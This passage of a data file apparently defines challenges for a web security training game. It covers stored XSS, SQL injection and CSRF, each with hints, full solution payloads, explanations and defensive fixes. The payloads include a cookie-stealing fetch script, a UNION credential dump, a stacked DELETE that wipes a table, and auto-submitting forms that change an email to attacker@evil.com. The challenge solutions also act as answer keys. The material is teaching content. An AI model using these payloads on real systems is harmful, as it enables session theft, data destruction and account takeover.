          type: "legend",
          delay: 2.0,
          items: [
            { code: '"', codeCls: "text-orange-400", desc: "closes the value attribute — you are now writing raw HTML attributes", delay: 2.0 },
            { code: "onclick", codeCls: "text-red-400", desc: "event handler — fires when the element is clicked", delay: 2.2 },
            { code: "alert('xss')", codeCls: "text-red-400", desc: "the JavaScript that runs — executes in the page context", delay: 2.6 },
          ],
        },
      ],
    },
    {
      id: "xss-3-stored",
      title: "Challenge 5: The Note Board",
      difficulty: 3,
      points: 200,
      targetName: "NoteNest",
      editorLanguage: "html",
      sandboxType: "container", // requires Docker — needs server-side state (stored posts,
                                // real Set-Cookie header, HTTP /logCookie endpoint for exfiltration)
      editorLabel: "Note Body",
      editorAction: "Post Note",
      editorHint: "Your note is saved to the server and rendered for every future visitor. Inject a script that silently reads document.cookie and sends it to an endpoint on the page.",
      editorPlaceholder: "<script>...</script>",
      summary: "Store a payload that silently exfiltrates the session cookie from every visitor.",
      description:
        "NoteNest is a public note-sharing app. Every note you post is saved and shown to every visitor — permanently.\n\nA cookie is a small piece of data the server stores in your browser to remember who you are. As long as you have it, the server treats you as the admin. If an attacker copies it, they can impersonate you without ever knowing your password.\n\nTo steal it, you'll need to:\n· Read the cookie value using JavaScript\n· Find an endpoint on the page that can receive data\n· Send the cookie to that endpoint silently",
      goal: "Post a note that calls fetch('/<API-endpoint>?<cookie variable name>=' + document.cookie) — exfiltrating the session cookie without the victim noticing",
      injectPath: "/inject?body={payload}",
      hints: [
        "First, confirm that scripts actually run on this page. Try injecting <script>alert(document.cookie)</script> as a note body — does an alert pop up? What value does it show?",
        "Right-click inside the NoteNest panel and choose View Frame Source. Scroll to the very bottom and look for any endpoints mentioned in the source that could receive data.",
        "Now combine what you have: use fetch() to silently send the cookie value to the endpoint you found. How would you append a value to a URL as a parameter?",
      ],
      solution: {
        payload: "<script>fetch('/logCookie?c='+document.cookie)</script>",
        explanation: [
          "Your <script> tag was saved to the server and ran automatically in every visitor's browser — no click, no warning, nothing visible to the victim.",
          "document.cookie contained the session token: the server's proof that this browser is the admin. fetch() silently sent it to /logCookie as a URL parameter.",
          "This is stored XSS — the most dangerous type. Unlike challenge 1 where the victim has to click a crafted link, here the attacker only needs to post the note once. Every future visitor is compromised automatically.",
          "In a real attack, the stolen token lets an attacker log in as the victim — without ever knowing their password.",
        ],
      },
      defense: {
        summary:
          "Two things went wrong at once: notes were saved and rendered without any cleaning (letting the script run), and the session cookie was readable by JavaScript (letting it be stolen). Fix either one and the attack fails. Fix both and you're properly protected.",
        measures: [
          {
            title: "Clean user input before saving or displaying it",
            body: "Strip dangerous tags like <script> before storing any user content. Libraries like DOMPurify (browser) or bleach (Python) do this automatically — just run content through them before touching the database or the page.",
          },
          {
            title: "Mark session cookies as HttpOnly",
            body: "Adding HttpOnly to a cookie makes it completely invisible to JavaScript — document.cookie won't show it at all. Even if XSS fires, the script has nothing to steal.",
          },
          {
            title: "Add a Content Security Policy (CSP)",
            body: "A CSP tells the browser which scripts are allowed to run. With a strict CSP, even if an attacker injects a script tag it gets blocked before it can execute.",
          },
        ],
      },
      animation: [
        {
          type: "block",
          label: "payload stored as a note",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "<script>", cls: "text-red-400 font-bold", delay: 0.1 },
            { text: "fetch", cls: "text-cyan-300", delay: 0.3 },
            { text: "(", cls: "text-gray-400", delay: 0.3 },
            { text: "'/logCookie?c='", cls: "text-green-400", delay: 0.3 },
            { text: " + ", cls: "text-gray-400", delay: 0.3 },
            { text: "document.cookie", cls: "text-yellow-300 font-bold", delay: 0.5 },
            { text: ")", cls: "text-gray-400", delay: 0.5 },
            { text: "</script>", cls: "text-red-400 font-bold", delay: 0.7 },
          ],
        },
        { type: "arrow", delay: 1.0, label: "every visitor loads the page" },
        {
          type: "block",
          label: "script runs in visitor's browser",
          accent: "yellow",
          delay: 1.2,
          segments: [
            { text: "document.cookie", cls: "text-yellow-300 font-bold", delay: 1.3 },
            { text: " → ", cls: "text-gray-500", delay: 1.5 },
            { text: "session=ADMIN_TOKEN_7f3kq9", cls: "text-purple-300 font-mono", delay: 1.7 },
          ],
        },
        { type: "arrow", delay: 2.0, label: "exfiltrated via fetch" },
        {
          type: "block",
          label: "server receives stolen cookie",
          accent: "green",
          delay: 2.2,
          segments: [
            { text: "GET ", cls: "text-gray-400", delay: 2.3 },
            { text: "/steal", cls: "text-cyan-300", delay: 2.3 },
            { text: "?c=", cls: "text-gray-400", delay: 2.3 },
            { text: "session=ADMIN_TOKEN_7f3kq9", cls: "text-purple-300", delay: 2.5 },
            { text: "✓ token confirmed — attacker can now log in as the victim", cls: "block text-xs text-green-400 mt-1.5", delay: 2.8 },
          ],
        },
        {
          type: "legend",
          delay: 3.0,
          items: [
            { code: "document.cookie", codeCls: "text-yellow-300", desc: "readable by JS because the cookie is not HttpOnly", delay: 3.0 },
            { code: "stored XSS", codeCls: "text-red-400", desc: "unlike reflected XSS, every visitor is compromised — not just the attacker", delay: 3.2 },
          ],
        },
      ],
    },
  ],

  sqli: [
    {
      id: "sqli-1-login",
      title: "Challenge 1: The Login Bypass",
      difficulty: 1,
      points: 100,
      targetName: "AdminPortal",
      editorLanguage: "plaintext",
      sandboxType: "sql",
      editorLabel: "SQL Terminal",
      editorAction: "Run Query",
      editorPlaceholder: "SHOW TABLES",
      editorHint: "Use this terminal to explore the database schema — try SHOW TABLES to see what tables exist. Direct reads of sensitive tables are blocked here; use the injection vector in the login form to surface that data. To solve the challenge, type your payload into the Username field and click Login.",
      summary: "Inject SQL into a login form to bypass authentication without a password.",
      description:
        "AdminPortal is a corporate login page. Only employees with valid credentials can access the admin dashboard.\n\nThe developer built the login query by pasting the username directly into a SQL string — no parameterization. This is the most common cause of SQL injection.\n\nTo find the vulnerability:\n· Submit any username and look at the Generated Query box below the login form.\n· Notice exactly where your input lands in the SQL. Think about what happens if your input contains a quote character.",
      goal: "Log in as admin without knowing the password.",
      hints: [
        "Look at the Generated Query box as you type. Your input lands directly inside single quotes: WHERE username = '<your input>' AND password = '...'",
        "A single quote ' in your input closes the string early. Everything after that is treated as SQL code, not as a value.",
        "The -- sequence is a SQL line comment. Anything after -- on the same line is ignored by the database — including the password check.",
        "The payload is: admin' -- — the quote closes the username string, and -- comments out the AND password = ... check entirely.",
      ],
      solution: {
        payload: "admin' --",
        explanation: [
          "The server built the SQL query by pasting your username directly into a string: WHERE username = 'admin' --' AND password = '...'.",
          "The single quote you injected closed the username string early. After it, you were writing raw SQL — not a value.",
          "-- is a SQL line comment. Everything after it was ignored, including AND password = '...'. The password check was never evaluated.",
          "The query now asked: give me the row where username = 'admin' — no password required. The database complied.",
        ],
      },
      defense: {
        summary: "The query was built by concatenating user input into a string. Parameterized queries make this injection impossible — the database never interprets input as SQL code.",
        measures: [
          {
            title: "Use parameterized queries (prepared statements)",
            body: "Instead of db.query(\"WHERE username = '\" + input + \"'\"), write db.query(\"WHERE username = ?\", [input]). The value is sent separately — the database treats it as data, never as SQL.",
          },
          {
            title: "Never concatenate user input into SQL strings",
            body: "Any time input is joined into a SQL string with + or template literals, the code is vulnerable. Use an ORM (SQLAlchemy, Hibernate, ActiveRecord) or query builder — they parameterize automatically.",
          },
          {
            title: "Apply least privilege to the database user",
            body: "The app's database user should only have SELECT / INSERT / UPDATE on the tables it needs. Even if injection occurs, the attacker cannot DROP TABLE or read other databases.",
          },
        ],
      },
      sqlSchema: {
        uiType: 'login',
        brand: 'AdminPortal',
        brandColor: '#f59e0b',
        btnColor: '#d97706',
        restrictedTables: ['users'],
        tables: {
          users: [
            { id: 1, username: 'admin', password: 'c0rp$3cret!9', role: 'admin' },
            { id: 2, username: 'alice', password: 'al1ce99pass',  role: 'user'  },
          ],
        },
        queryTemplate: "SELECT * FROM users WHERE username = '{input}' AND password = '...'",
        winCondition: "rows.some(function(r) { return r.role === 'admin'; })",
        winMessage: 'SQLi Triggered! Logged in as admin — no password needed.',
        successRows: [
          ['DB_HOST',       'db.internal.corp'       ],
          ['DB_PASSWORD',   'Sup3r$3cret_2024!'      ],
          ['STRIPE_SECRET', 'sk_live_4Kq9...redacted'],
          ['ADMIN_COUNT',   '14 accounts found'      ],
        ],
      },
      animation: [
        {
          type: "block",
          label: "vulnerable query template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "WHERE username = '", cls: "text-gray-400" },
            { text: "\" + username + \"", cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: "' AND password = '...'", cls: "text-gray-400" },
            { text: "↑ username pasted directly into SQL string — no parameterization", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: "payload: admin' --" },
        {
          type: "block",
          label: "resulting SQL the database sees",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "WHERE username = '", cls: "text-gray-400" },
            { text: "admin", cls: "text-orange-300 font-bold", delay: 1.1 },
            { text: "'", cls: "text-orange-400 font-bold", delay: 1.3 },
            { text: " --", cls: "text-gray-600 font-bold", delay: 1.5 },
            { text: "' AND password = '...'", cls: "text-gray-700 line-through", delay: 1.5 },
            { text: "↑ quote closed the string — everything after -- is a comment", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 1.7 },
          ],
        },
        {
          type: "legend",
          delay: 2.0,
          items: [
            { code: "'",        codeCls: "text-orange-400", desc: "closes the username string — you are now writing raw SQL", delay: 2.0 },
            { code: "--",       codeCls: "text-gray-500",   desc: "SQL line comment — everything after this is ignored", delay: 2.2 },
            { code: "AND password = '...'", codeCls: "text-gray-600", desc: "commented out — the password check never runs", delay: 2.4 },
          ],
        },
      ],
    },
    {
      id: "sqli-2-union",
      title: "Challenge 2: The Product Search",
      difficulty: 2,
      points: 200,
      targetName: "ShopDB",
      editorLanguage: "plaintext",
      sandboxType: "sql",
      editorLabel: "SQL Terminal",
      editorAction: "Run Query",
      editorPlaceholder: "SHOW TABLES",
      editorHint: "Use this terminal to explore the database schema — try SHOW TABLES to see what tables exist, or SELECT * FROM products to inspect queryable data. Direct reads of sensitive tables are blocked here; use the injection vector in the search bar to surface that data. To solve the challenge, type your payload into the Product Search bar and click Search.",
      summary: "Use a UNION injection to extract credentials from a table the application never intended to expose.",
      description:
        "ShopDB is an internal product catalogue used by warehouse staff. The search field passes your input directly into a SQL LIKE query — no parameterization.\n\nThe query returns three columns: id, name, and price. SQL's UNION operator lets you attach a second SELECT to that same result set — but only if your injected SELECT also returns exactly three columns.\n\nTo find the vulnerability:\n· Use the SQL Terminal on the left to explore the database schema.\n· Submit any search term in the portal and observe the Generated Query box.\n· A single quote breaks out of the LIKE string and lets you write raw SQL.\n· Figure out how many columns the query returns, then inject a UNION SELECT that reads from a table you discovered.",
      goal: "Dump the users table — make admin's credentials appear in the search results.",
      hints: [
        "Start with recon. Run SHOW TABLES in the SQL Terminal on the left — it lists every table in the database. Look at what else exists beyond the products table.",
        "Now figure out the columns. Run SELECT * FROM <tablename> LIMIT 1 in the terminal to see the column names of any table you found.",
        "Type a single quote ' in the search box and click Search. The Generated Query shows it breaking out of the LIKE string. A UNION SELECT must return the same number of columns as the original query — probe the count: try ' ORDER BY 3 -- (works) vs ' ORDER BY 4 -- (error).",
        "You now know the table name, its columns, and the column count. Build your UNION: ' UNION SELECT col1, col2, col3 FROM <table> -- — replace each col with the column names you discovered.",
      ],
      solution: {
        payload: "' UNION SELECT 1, username, password FROM users --",
        explanation: [
          "The original query returns 3 columns (id, name, price) via a LIKE match. UNION appends a second SELECT's rows to that result set.",
          "A UNION requires both SELECTs to return the same number of columns. The payload provides 3: a filler 1 for the id slot, then username and password.",
          "FROM users points the injected SELECT at a table the application never intended to expose — the users table holding account credentials.",
          "The trailing -- comments out the rest of the original query (%'), keeping the SQL syntactically valid. The admin row now appears in the product results.",
        ],
      },
      defense: {
        summary: "The query was built by concatenating user input into a LIKE string. Parameterized queries prevent this — the database never interprets input as SQL code.",
        measures: [
          {
            title: "Use parameterized queries (prepared statements)",
            body: "Instead of db.query(\"WHERE name LIKE '%\" + input + \"%'\"), write db.query(\"WHERE name LIKE ?\", ['%' + input + '%']). The value is sent separately — the database treats it as data, never as SQL.",
          },
          {
            title: "Apply column-level access control at the database layer",
            body: "Grant the application's database user SELECT only on the columns and tables it actually needs. Even if UNION injection occurs, an attacker cannot read tables outside the granted scope.",
          },
          {
            title: "Never concatenate user input into SQL strings",
            body: "Any time input is joined into a SQL string — even inside a LIKE pattern — the code is vulnerable. Use an ORM or query builder; they parameterize automatically.",
          },
        ],
      },
      sqlSchema: {
        uiType: 'search',
        brand: 'ShopDB',
        brandColor: '#38bdf8',
        btnColor: '#0369a1',
        restrictedTables: ['users'],
        tables: {
          products: [
            { id: 1, name: 'Laptop Pro X',        price: '$1,299' },
            { id: 2, name: 'Wireless Mouse',      price: '$49'    },
            { id: 3, name: 'USB-C Hub',           price: '$79'    },
            { id: 4, name: 'Mechanical Keyboard', price: '$149'   },
            { id: 5, name: 'Monitor 27in',        price: '$399'   },
          ],
          users: [
            { id: 1, username: 'admin', password: 's3cr3tAdm1n!' },
            { id: 2, username: 'alice', password: 'al1ce99pass'  },
          ],
        },
        queryTemplate: "SELECT id, name, price FROM products WHERE name LIKE '%{input}%'",
        columns: ['id', 'name', 'price'],
        columnHeaders: ['ID', 'NAME', 'PRICE'],
        winCondition: "rows.some(function(r) { return Object.values(r).some(function(v) { return String(v).toLowerCase() === 'admin'; }); })",
        winMessage: 'SQLi Triggered! Users table dumped — admin credentials exposed.',
        pageComment: 'TODO: decommission legacy users table after v3 auth migration (#341)',
      },
      animation: [
        {
          type: "block",
          label: "vulnerable query template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "WHERE name LIKE '%", cls: "text-gray-400" },
            { text: "\" + search + \"", cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: "%'", cls: "text-gray-400" },
            { text: "↑ search term pasted directly into LIKE string — no parameterization", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: "payload: ' UNION SELECT 1, username, password FROM users --" },
        {
          type: "block",
          label: "resulting SQL the database sees",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "WHERE name LIKE '%", cls: "text-gray-400" },
            { text: "'", cls: "text-orange-400 font-bold", delay: 1.1 },
            { text: " UNION SELECT ", cls: "text-red-400 font-bold", delay: 1.3 },
            { text: "1, username, password", cls: "text-orange-300 font-bold", delay: 1.5 },
            { text: " FROM ", cls: "text-red-400 font-bold", delay: 1.7 },
            { text: "users", cls: "text-purple-400 font-bold", delay: 1.7 },
            { text: " -- '%'", cls: "text-gray-600", delay: 1.9 },
            { text: "↑ LIKE ends at ' — UNION appends a second SELECT that reads credentials from users", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 2.1 },
          ],
        },
        {
          type: "legend",
          delay: 2.3,
          items: [
            { code: "'", codeCls: "text-orange-400", desc: "closes the LIKE string — you are now writing raw SQL", delay: 2.3 },
            { code: "UNION SELECT", codeCls: "text-red-400", desc: "appends a second query's rows — must return the same number of columns (3)", delay: 2.5 },
            { code: "FROM users", codeCls: "text-purple-400", desc: "reads from a table the application never intended to expose", delay: 2.7 },
            { code: "-- '%'", codeCls: "text-gray-500", desc: "comments out the trailing %' so the SQL remains valid", delay: 2.9 },
          ],
        },
      ],
    },
    {
      id: "sqli-3-stacked",
      title: "Challenge 3: The Employee Directory",
      difficulty: 3,
      points: 300,
      targetName: "StaffDB",
      editorLanguage: "plaintext",
      sandboxType: "sql",
      editorLabel: "SQL Terminal",
      editorAction: "Run Query",
      editorPlaceholder: "SHOW TABLES",
      editorHint: "Use this terminal to run any SQL query and explore the database — try SHOW TABLES or SELECT * FROM tablename. Results appear in the SQL Terminal panel inside the portal. To solve the challenge, type your injection payload directly into the Department search bar in the portal and click Search.",
      summary: "Chain a second SQL statement using a semicolon to wipe an entire table the app never meant to modify.",
      description:
        "StaffDB is an internal HR portal. Warehouse staff use it to look up colleagues by department.\n\nThe department filter is built by pasting user input directly into a SQL WHERE clause — no parameterization. This is the same root cause as Challenge 1, but this time the goal isn't authentication bypass.\n\nSQL supports multiple statements separated by a semicolon (;). Most database drivers execute each statement in sequence. If you can escape the current string and append a semicolon, you can inject a completely independent second statement — one the application never called.\n\nTo explore the vulnerability:\n· Type a department name like Engineering and observe the Generated Query.\n· Try breaking out of the string with a single quote. What does the query look like?\n· Think about what comes after the semicolon.",
      goal: "Use a stacked query to delete every row from the employees table.",
      hints: [
        "Type Engineering in the search box and study the Generated Query. Your input lands inside single quotes: WHERE dept = 'Engineering'. A single quote breaks out of that string.",
        "After breaking out of the string with ', you can write raw SQL. A semicolon ; ends the current SELECT statement and lets you begin a brand-new one.",
        "The second statement runs independently — it can be anything the database user is allowed to execute. What SQL command removes all rows from a table? (Hint: it starts with DELETE.)",
        "The payload is: '; DELETE FROM employees WHERE 1=1 -- — the quote closes the string, ; starts a second statement, DELETE removes every row, and -- comments out the trailing quote.",
      ],
      solution: {
        payload: "'; DELETE FROM employees WHERE 1=1 --",
        explanation: [
          "The original query was SELECT id, name, dept FROM employees WHERE dept = '...'. Your input landed directly inside the single quotes.",
          "The leading ' closed the dept string early. After it you were writing raw SQL, not a value. The semicolon ; ended the SELECT statement entirely.",
          "DELETE FROM employees WHERE 1=1 is a fully independent second statement. WHERE 1=1 is always true, so it matches and deletes every row.",
          "The trailing -- comments out the closing ' that was left over from the original template. The database ran both statements: first the SELECT (which returned nothing), then the DELETE.",
        ],
      },
      defense: {
        summary: "Stacked queries are only possible because user input was concatenated directly into SQL. Parameterized queries prevent both the string escape and the statement injection.",
        measures: [
          {
            title: "Use parameterized queries (prepared statements)",
            body: "Instead of db.query(\"WHERE dept = '\" + input + \"'\"), write db.query(\"WHERE dept = ?\", [input]). The value is sent to the database as data — the driver never lets it become executable SQL, regardless of what characters it contains.",
          },
          {
            title: "Apply least-privilege database permissions",
            body: "The application's database user should only have SELECT on the tables it reads. A user without DELETE or DROP TABLE permission cannot execute destructive stacked queries even if injection occurs.",
          },
          {
            title: "Use an ORM or query builder",
            body: "Libraries like SQLAlchemy, Hibernate, and Sequelize generate parameterized queries automatically. You never concatenate input into SQL strings, so stacked-query injection cannot happen.",
          },
        ],
      },
      sqlSchema: {
        uiType: 'stacked',
        brand: 'StaffDB',
        brandColor: '#a78bfa',
        btnColor: '#7c3aed',
        targetTable: 'employees',
        tables: {
          employees: [
            { id: 1, name: 'Alice Chen',    dept: 'Engineering', salary: '$95,000'  },
            { id: 2, name: 'Bob Martinez',  dept: 'Engineering', salary: '$88,000'  },
            { id: 3, name: 'Carol White',   dept: 'HR',          salary: '$72,000'  },
            { id: 4, name: 'David Kim',     dept: 'Finance',     salary: '$105,000' },
            { id: 5, name: 'Eva Santos',    dept: 'Engineering', salary: '$91,000'  },
          ],
        },
        queryTemplate: "SELECT id, name, dept FROM employees WHERE dept = '{input}'",
        columns: ['id', 'name', 'dept'],
        columnHeaders: ['ID', 'NAME', 'DEPARTMENT'],
        winCondition: "!alasql.tables.employees || alasql.tables.employees.data.length === 0",
        winMessage: "Stacked Query Executed! All employee records wiped.",
      },
      animation: [
        {
          type: "block",
          label: "vulnerable query template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "WHERE dept = '", cls: "text-gray-400" },
            { text: "\" + dept + \"", cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: "'", cls: "text-gray-400" },
            { text: "↑ department name pasted directly — no parameterization", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: "payload: '; DELETE FROM employees WHERE 1=1 --" },
        {
          type: "block",
          label: "resulting SQL — two statements execute",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "WHERE dept = '", cls: "text-gray-400" },
            { text: "'", cls: "text-orange-400 font-bold", delay: 1.1 },
            { text: " ;", cls: "text-red-400 font-bold", delay: 1.2 },
            { text: " DELETE FROM ", cls: "text-red-400 font-bold", delay: 1.4 },
            { text: "employees", cls: "text-purple-400 font-bold", delay: 1.6 },
            { text: " WHERE 1=1 ", cls: "text-orange-300 font-bold", delay: 1.8 },
            { text: "--'", cls: "text-gray-600", delay: 2.0 },
            { text: "↑ ; ends the SELECT — DELETE runs as a second independent statement", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 2.1 },
          ],
        },
        {
          type: "legend",
          delay: 2.3,
          items: [
            { code: "'",                   codeCls: "text-orange-400", desc: "closes the dept string — you are now writing raw SQL", delay: 2.3 },
            { code: ";",                   codeCls: "text-red-400",    desc: "terminates the SELECT and begins a second, independent statement", delay: 2.5 },
            { code: "DELETE FROM employees", codeCls: "text-purple-400", desc: "second statement — wipes the entire table", delay: 2.7 },
            { code: "WHERE 1=1",           codeCls: "text-orange-300", desc: "always true — matches and deletes every row without exception", delay: 2.9 },
            { code: "--'",                 codeCls: "text-gray-500",   desc: "comments out the trailing quote left over from the template", delay: 3.1 },
          ],
        },
      ],
    },
  ],

  csrf: [
    {
      id: "csrf-1-get",
      title: "Challenge 1: The Silent Request",
      difficulty: 1,
      points: 100,
      targetName: "UserHub",
      editorLanguage: "html",
      sandboxType: "csrf",
      editorLabel: "Attacker Page",
      editorAction: "Launch Attack",
      editorHint: "Write the HTML for your attacker page. When the victim visits it, the browser will fire any requests it finds — including ones that carry the victim's session cookie automatically.",
      editorPlaceholder: "<img src=\"...\">",
      summary: "Craft an attacker page that silently changes the victim's email via a GET request.",
      description:
        "UserHub is an account management portal. The 'change email' endpoint accepts a GET request with no CSRF token — whoever the session cookie says you are, that's whose email gets changed.\n\nThe victim is logged in to UserHub in the right pane. They're about to visit your page.\n\nWrite an attacker page in the left editor. When the victim's browser loads it, it should fire a GET request to /change-email that silently changes their email to one you control.",
      goal: "Change the victim's email to attacker@evil.com using only HTML.",
      hints: [
        "Which HTML element makes the browser fetch a URL automatically, with no user interaction? It's usually used for images.",
        "An <img> tag fires a GET request for its src the moment it loads — even if the URL isn't an image.",
        "The target endpoint is /change-email and it accepts an email query parameter. Try: <img src=\"/change-email?email=attacker@evil.com\">",
        "The browser attaches the victim's session cookie automatically — you don't need to do anything special for that.",
      ],
      solution: {
        payload: "<img src=\"/change-email?email=attacker@evil.com\">",
        explanation: [
          "The <img> tag told the browser to fetch /change-email?email=attacker@evil.com the instant your attacker page loaded.",
          "The browser attached the victim's session cookie automatically — it always does this for matching domains.",
          "The server saw a valid authenticated GET request and changed the email. It had no way to tell the request came from a different page.",
          "This is GET-based CSRF — any endpoint that changes state via GET is exploitable with a single HTML tag.",
        ],
      },
      defense: {
        summary: "Two fixes are needed: move state-changing actions to POST (so a bare <img> can't trigger them), and add a CSRF token so the server can verify the request originated from its own page.",
        measures: [
          {
            title: "Never change state with a GET request",
            body: "GET is defined as a 'safe' method — browsers, proxies, and prefetchers freely follow GET URLs. Any action that changes data must use POST, PUT, PATCH, or DELETE.",
          },
          {
            title: "Require a CSRF token on all state-changing endpoints",
            body: "Generate a secret per-session token, embed it in every form, and validate it server-side on submission. Because the attacker's page can't read the token from your site (blocked by Same-Origin Policy), it can't forge a valid request.",
          },
        ],
      },
      animation: [
        {
          type: "block",
          label: "attacker page loaded by victim browser",
          accent: "red",
          delay: 0,
          segments: [
            { text: "<img ", cls: "text-red-400" },
            { text: 'src="', cls: "text-gray-400" },
            { text: "/change-email?email=attacker@evil.com", cls: "text-orange-300", delay: 0.3 },
            { text: '">', cls: "text-gray-400" },
            { text: "↑ browser fires GET automatically on load", cls: "block text-xs text-orange-500 mt-1", delay: 0.6 },
          ],
        },
        {
          type: "arrow",
          label: "browser attaches session cookie",
          delay: 0.8,
        },
        {
          type: "block",
          label: "request received by server",
          accent: "orange",
          delay: 1.0,
          segments: [
            { text: "GET ", cls: "text-gray-400" },
            { text: "/change-email", cls: "text-cyan-300" },
            { text: "?email=", cls: "text-gray-400" },
            { text: "attacker@evil.com", cls: "text-red-400", delay: 1.2 },
            { text: "\nCookie: ", cls: "text-gray-400 block mt-1" },
            { text: "session_id=victim_token", cls: "text-yellow-300", delay: 1.4 },
            { text: "\n✓ server sees valid session — email changed", cls: "block text-xs text-green-400 mt-1.5", delay: 1.7 },
          ],
        },
        {
          type: "legend",
          delay: 2.0,
          items: [
            { code: "<img src>", codeCls: "text-red-400", desc: "fires a GET request automatically — no user interaction needed", delay: 2.0 },
            { code: "session cookie", codeCls: "text-yellow-300", desc: "attached by the browser automatically — the attacker never touches it", delay: 2.2 },
            { code: "no CSRF token", codeCls: "text-orange-400", desc: "server can't tell this request didn't come from its own page", delay: 2.4 },
          ],
        },
      ],
    },
    {
      id: "csrf-2-post",
      title: "Challenge 2: The Hidden Form",
      difficulty: 2,
      points: 150,
      targetName: "UserHub",
      editorLanguage: "html",
      sandboxType: "csrf",
      editorLabel: "Attacker Page",
      editorAction: "Launch Attack",
      editorHint: "Write the HTML for your attacker page. The endpoint now requires POST — an <img> tag won't work. You need a form that submits itself the moment the page loads.",
      editorPlaceholder: "<form method=\"POST\" action=\"...\">...</form>\n<script>document.forms[0].submit()</script>",
      summary: "Auto-submit a hidden form to trigger a POST-based CSRF attack.",
      description:
        "UserHub updated the change-email endpoint to require POST. The <img> trick from Challenge 1 no longer works — browsers only fire GET requests from <img> tags.\n\nBut a <form> can send POST. And a <script> can submit that form the instant the page loads — before the victim sees anything.\n\nCraft an attacker page with a hidden auto-submitting form.",
      goal: "Change the victim's email to attacker@evil.com using a POST request.",
      hints: [
        "An <img> tag fires a GET request. For POST, you need a <form> with method=\"POST\".",
        "Set the form's action to /change-email and add a hidden input for the email field.",
        "The form won't submit itself automatically — you need a <script> that calls document.forms[0].submit() right after the form.",
        "Full payload: <form method=\"POST\" action=\"/change-email\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit()</script>",
      ],
      solution: {
        payload: "<form method=\"POST\" action=\"/change-email\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit()</script>",
        explanation: [
          "The hidden form was invisible to the victim — no UI, no prompt, nothing to click.",
          "document.forms[0].submit() fired the moment the attacker page loaded, sending a POST to /change-email.",
          "The browser attached the session cookie to the POST request automatically — just as it does for GET.",
          "The server received a valid authenticated POST and changed the email. Using POST instead of GET is necessary but not sufficient — without a CSRF token, the server still can't distinguish a forged request from a real one.",
        ],
      },
      defense: {
        summary: "POST prevents accidental CSRF via browser prefetching, but deliberate attacks still work. A CSRF token is the real fix.",
        measures: [
          {
            title: "Require a CSRF token on all POST endpoints",
            body: "The token must be: generated per-session, embedded in every form, and validated server-side. An attacker's page can't read the token from your site, so it can't include a valid one.",
          },
          {
            title: "Set SameSite=Strict or SameSite=Lax on session cookies",
            body: "SameSite=Strict tells the browser to never send the cookie on cross-site requests. SameSite=Lax blocks it on cross-site POST. Either stops this attack at the cookie level.",
          },
        ],
      },
      animation: [
        {
          type: "block",
          label: "attacker page — hidden form + auto-submit",
          accent: "red",
          delay: 0,
          segments: [
            { text: '<form method="POST" action="/change-email">\n', cls: "text-red-400" },
            { text: '  <input type="hidden" name="email"\n', cls: "text-gray-300", delay: 0.3 },
            { text: '         value="attacker@evil.com">\n', cls: "text-orange-300", delay: 0.4 },
            { text: "</form>", cls: "text-red-400", delay: 0.5 },
            { text: "\n<script>", cls: "text-gray-400", delay: 0.6 },
            { text: "document.forms[0].submit()", cls: "text-yellow-300", delay: 0.7 },
            { text: "<\/script>", cls: "text-gray-400", delay: 0.8 },
          ],
        },
        {
          type: "arrow",
          label: "POST fires on page load — session cookie attached",
          delay: 1.0,
        },
        {
          type: "block",
          label: "server receives authenticated POST",
          accent: "orange",
          delay: 1.2,
          segments: [
            { text: "POST /change-email HTTP/1.1\n", cls: "text-cyan-300" },
            { text: "Cookie: session_id=victim_token\n", cls: "text-yellow-300", delay: 1.4 },
            { text: "\nemail=attacker@evil.com", cls: "text-red-400", delay: 1.6 },
            { text: "\n✓ POST accepted — email changed", cls: "block text-xs text-green-400 mt-1.5", delay: 1.9 },
          ],
        },
      ],
    },
    {
      id: "csrf-3-token",
      title: "Challenge 3: The Useless Token",
      difficulty: 2,
      points: 150,
      targetName: "UserHub",
      editorLanguage: "html",
      sandboxType: "csrf",
      editorLabel: "Attacker Page",
      editorAction: "Launch Attack",
      editorHint: "The form now has a csrf_token field. Inspect the victim page and check whether the server actually validates it — or just checks that the field exists.",
      editorPlaceholder: "<form method=\"POST\" action=\"...\">...</form>\n<script>document.forms[0].submit()</script>",
      summary: "Bypass a CSRF token that is present in the form but never validated server-side.",
      description:
        "UserHub added a CSRF token to the change-email form. You can see it in the victim pane.\n\nBut 'token present' doesn't mean 'token validated'. Check whether the server actually verifies the value — or whether any value (or no value) is silently accepted.\n\nYour form must include the csrf_token field. The value is up to you.",
      goal: "Change the victim's email to attacker@evil.com despite the CSRF token field.",
      hints: [
        "Right-click the victim pane and view source. The form has a csrf_token hidden input — but does the server check its value?",
        "Include the csrf_token field in your forged form with any value — try 'fake', 'x', or even an empty string.",
        "If any value works, the server is checking that the field exists but not that it matches the session token. That's the vulnerability.",
        "Full payload: <form method=\"POST\" action=\"/change-email\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"><input type=\"hidden\" name=\"csrf_token\" value=\"fake\"></form><script>document.forms[0].submit()</script>",
      ],
      solution: {
        payload: "<form method=\"POST\" action=\"/change-email\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"><input type=\"hidden\" name=\"csrf_token\" value=\"fake\"></form><script>document.forms[0].submit()</script>",
        explanation: [
          "The csrf_token field was present in the form, but the server never checked whether it matched the session's real token.",
